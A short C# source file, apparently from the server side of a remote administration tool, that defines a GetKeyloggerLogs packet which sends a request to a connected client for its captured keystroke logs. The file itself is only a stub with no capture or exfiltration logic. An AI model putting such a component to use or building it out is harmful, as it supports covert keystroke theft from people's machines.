using ProtoBuf;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetKeyloggerLogs : IPacket
    {
        public GetKeyloggerLogs() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}